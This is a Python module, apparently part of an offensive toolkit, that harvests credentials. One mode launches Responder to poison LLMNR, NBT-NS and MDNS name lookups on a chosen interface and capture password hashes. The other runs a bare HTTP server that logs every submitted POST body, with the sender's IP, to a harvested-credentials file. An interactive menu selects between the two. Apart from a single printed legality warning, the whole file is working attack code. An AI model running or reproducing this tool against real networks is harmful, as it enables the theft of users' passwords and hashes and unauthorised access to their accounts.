#!/usr/bin/env python3
"""Credential Harvester using Responder"""

import subprocess
import os
from ..utils.colors import Colors
from ..utils.logger import Logger


def run(interface=None):
    """
    Run Responder to capture credentials via LLMNR/NBT-NS/MDNS poisoning
    """
    print(Colors.warning("⚠️  Credential harvesting may be illegal without authorization!"))
    print(Colors.info("Starting Responder for credential capture..."))
    print(Colors.info("This will poison LLMNR/NBT-NS/MDNS requests on the network"))
    
    cmd = ['responder', '-I', interface] if interface else ['responder', '-I', 'eth0']
    
    try:
        print(Colors.success("Responder started. Waiting for credentials..."))
        print(Colors.info("Captured hashes will be saved to /usr/share/responder/logs/"))
        subprocess.run(cmd)
    except FileNotFoundError:
        print(Colors.error("Responder not found"))
        return False
    except KeyboardInterrupt:
        print(Colors.warning("\nResponder stopped"))
    
    return True


def http_server(port=80):
    """Simple HTTP credential harvester"""
    import http.server
    import socketserver
    
    class CredHandler(http.server.SimpleHTTPRequestHandler):
        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            print(Colors.success(f"[CREDS] {self.client_address[0]}: {post_data}"))
            
            # Log credentials
            with open('/var/log/bhtk/harvested_creds.txt', 'a') as f:
                f.write(f"{self.client_address[0]}: {post_data}\n")
            
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
        
        def log_message(self, format, *args):
            pass  # Suppress default logging
    
    print(Colors.info(f"Starting HTTP credential harvester on port {port}"))
    print(Colors.info("POST requests will be logged"))
    
    try:
        with socketserver.TCPServer(("", port), CredHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print(Colors.warning("\nServer stopped"))
    except PermissionError:
        print(Colors.error(f"Cannot bind to port {port}, try a port > 1024"))


def interactive():
    """Interactive credential harvester"""
    logger = Logger("harvester")
    
    print("\nHarvester mode:")
    print("  [1] Responder (LLMNR/NBT-NS poisoning)")
    print("  [2] Simple HTTP POST harvester")
    
    mode = input(Colors.prompt("Mode [1]: ")).strip() or "1"
    
    if mode == "1":
        interface = input(Colors.prompt("Interface [eth0]: ")).strip() or "eth0"
        logger.info(f"Responder on {interface}")
        
        confirm = input(Colors.prompt("Start Responder? [y/N]: ")).strip().lower()
        if confirm == 'y':
            run(interface)
    else:
        port = input(Colors.prompt("HTTP port [80]: ")).strip() or "80"
        logger.info(f"HTTP harvester on port {port}")
        http_server(int(port))
